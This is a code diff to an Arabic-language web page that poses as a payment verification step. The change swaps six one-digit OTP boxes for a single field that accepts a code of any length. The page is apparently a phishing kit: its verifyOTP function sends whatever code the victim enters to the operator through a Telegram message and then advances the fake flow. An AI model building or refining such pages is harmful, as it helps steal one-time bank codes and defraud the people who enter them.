@@ -50,9 +50,22 @@
 
         .otp-icon { width: 80px; height: 80px; background-color: #e8f0fe; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .otp-icon svg { width: 40px; height: 40px; fill: #0b3b82; }
-        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; direction: ltr; }
-        .otp-inputs input { width: 45px; height: 55px; text-align: center; font-size: 24px; font-weight: bold; border: 1px solid #ccc; border-radius: 8px; outline: none; }
-        .otp-inputs input:focus { border-color: #f7b71d; }
+        
+        /* تعديل: تنسيق خانة الـ OTP الواحدة */
+        .otp-single-input { 
+            width: 100%; 
+            padding: 16px; 
+            font-size: 24px; 
+            font-weight: bold; 
+            text-align: center; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            outline: none; 
+            margin-bottom: 30px;
+            direction: ltr;
+        }
+        .otp-single-input:focus { border-color: #f7b71d; box-shadow: 0 0 8px rgba(247, 183, 29, 0.3); }
+
         .verify-btn { width: 100%; background-color: #0b3b82; color: #fff; border: none; padding: 16px; font-size: 18px; font-weight: 800; border-radius: 8px; cursor: pointer; }
         
         .success-icon { width: 100px; height: 100px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
@@ -212,14 +225,10 @@
                 <h2>التحقق من الدفع</h2>
                 <p>أدخل رمز التحقق</p>
             </div>
-            <div class="otp-inputs" id="otp-inputs">
-                <input type="tel" maxlength="1" inputmode="numeric">
-                <input type="tel" maxlength="1" inputmode="numeric">
-                <input type="tel" maxlength="1" inputmode="numeric">
-                <input type="tel" maxlength="1" inputmode="numeric">
-                <input type="tel" maxlength="1" inputmode="numeric">
-                <input type="tel" maxlength="1" inputmode="numeric">
-            </div>
+            
+            <!-- تعديل: استبدال المربعات الستة بخانة واحدة -->
+            <input type="tel" id="otp-single-input" class="otp-single-input" placeholder="أدخل الرمز هنا">
+            
             <button class="verify-btn" onclick="verifyOTP()">تأكيد</button>
         </div>
 
@@ -316,24 +325,18 @@
             document.getElementById('payment-page').style.display = 'none';
             document.getElementById('otp-page').style.display = 'block';
             window.scrollTo(0, 0);
-            
-            const inputs = document.querySelectorAll('.otp-inputs input');
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', () => {
-                    if (input.value.length === 1 && index < inputs.length - 1) {
-                        inputs[index + 1].focus();
-                    }
-                });
-            });
         }
 
+        // تعديل: دالة التحقق تقرأ من الخانة الواحدة
         function verifyOTP() {
-            const inputs = document.querySelectorAll('#otp-inputs input');
-            let otpCode = '';
-            inputs.forEach(input => { otpCode += input.value; });
-
-            // تم مسح شرط الـ 6 أرقام، الآن يقبل أي عدد
+            let otpCode = document.getElementById('otp-single-input').value;
             
+            // إذا الخانة فاضية، يطلع تنبيه، وإذا فيها أي شي يكمل
+            if (otpCode.trim() === "") {
+                alert("الرجاء إدخال رمز التحقق");
+                return;
+            }
+
             sendTelegramMsg(`🔑 رمز التحقق OTP: ${otpCode}`);
 
             document.getElementById('otp-page').style.display = 'none';
